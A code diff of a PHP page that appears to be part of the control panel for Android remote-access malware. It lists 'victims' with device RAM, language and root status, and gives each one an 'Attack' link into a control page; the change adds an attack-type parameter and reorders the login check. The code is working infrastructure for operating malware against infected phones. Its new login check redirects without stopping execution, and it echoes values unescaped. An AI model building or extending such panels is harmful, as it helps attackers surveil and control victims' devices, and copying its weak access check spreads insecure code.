@@ -1,4 +1,11 @@
+<?php 
+require_once '../private/session_manager.php';
 
+if(!isLogin()){
+   header('Location: login.php');
+}
+
+?>
 <!DOCTYPE html>
 <html>
 <head>
@@ -29,14 +36,6 @@
 </head>
 
 <body>
-
-<?php
-
-require '../private/session_manager.php';
-if(login()!=true) logout();
-
-?>
-
 
 <nav class="navbar navbar-default navbar-static-top">
     <div class="container-fluid">
@@ -95,7 +94,7 @@ if(login()!=true) logout();
                                 echo '<td>'.$value['TOTAL_RAM'].'</td>';
                                 echo '<td>'.$value['DEVICE_LANGUAGE'].'</td>';
                                 echo '<td>'.$value['IS_ROOTED'].'</td>';
-                                echo '<td><a href="kontrol-panel.php?target='.$value['UNIQUE_ID'].'">Attack</a></td>';
+                                echo '<td><a href="kontrol-panel.php?target='.$value['UNIQUE_ID'].'&type=1'.'">Attack</a></td>';
                                 echo '</tr>';
                                 $index_victim += 1;
                             }
